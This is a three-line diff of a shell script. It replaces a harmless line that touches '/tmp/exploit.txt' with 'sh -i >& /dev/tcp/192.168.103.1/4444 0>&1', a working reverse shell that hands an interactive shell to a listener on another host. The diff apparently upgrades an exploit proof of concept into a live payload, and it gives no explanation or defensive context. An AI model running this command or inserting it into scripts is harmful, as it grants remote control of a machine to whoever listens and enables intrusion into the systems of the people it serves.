@@ -1,3 +1,3 @@
 #!/bin/sh
 
-touch /tmp/exploit.txt
+sh -i >& /dev/tcp/192.168.103.1/4444 0>&1
